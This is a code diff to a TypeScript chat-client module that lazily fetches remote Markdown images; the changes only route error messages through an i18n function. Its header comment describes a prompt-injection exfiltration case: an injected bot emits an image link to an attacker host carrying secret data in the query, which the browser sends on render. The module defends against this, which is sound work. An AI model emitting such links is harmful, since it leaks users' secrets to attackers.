@@ -1,3 +1,5 @@
+import { t } from './i18n'
+
 /**
  * 對話 Markdown 裡的遠端圖片（issue #764）。bot 會讀外部內容，被 prompt injection 後輸出 `![](https://攻擊者/c?d=機密)`，
  * 瀏覽器一渲染就替它送出去——所以 http(s) 圖片預設不載入，先畫佔位，使用者點了才抓。
@@ -73,10 +75,10 @@ export function safeImageType(contentType: string): string | null {
 /** 邊讀邊數，超過上限就停（不等整個回應進記憶體才檢查大小）。 */
 async function readCapped(res: Response, type: string): Promise<Blob> {
   const declared = Number(res.headers.get('content-length'))
-  if (Number.isFinite(declared) && declared > REMOTE_IMAGE_MAX_BYTES) throw new Error('圖片太大')
+  if (Number.isFinite(declared) && declared > REMOTE_IMAGE_MAX_BYTES) throw new Error(t('圖片太大'))
   if (!res.body) {
     const b = await res.blob()
-    if (b.size > REMOTE_IMAGE_MAX_BYTES) throw new Error('圖片太大')
+    if (b.size > REMOTE_IMAGE_MAX_BYTES) throw new Error(t('圖片太大'))
     return new Blob([b], { type })
   }
   const reader = res.body.getReader()
@@ -88,7 +90,7 @@ async function readCapped(res: Response, type: string): Promise<Blob> {
     total += value.byteLength
     if (total > REMOTE_IMAGE_MAX_BYTES) {
       await reader.cancel().catch(() => {})
-      throw new Error('圖片太大')
+      throw new Error(t('圖片太大'))
     }
     chunks.push(value)
   }
@@ -107,6 +109,6 @@ export async function fetchRemoteImageBlob(src: string, fetchImpl: typeof fetch 
   if (!res.ok) throw new Error(`HTTP ${res.status}`)
   const raw = res.headers.get('content-type') ?? ''
   const type = safeImageType(raw)
-  if (!type) throw new Error(/^image\//i.test(raw) ? '不支援的圖片格式（SVG 等可以帶腳本的不收）' : '不是圖片')
+  if (!type) throw new Error(/^image\//i.test(raw) ? t('不支援的圖片格式（SVG 等可以帶腳本的不收）') : t('不是圖片'))
   return readCapped(res, type)
 }
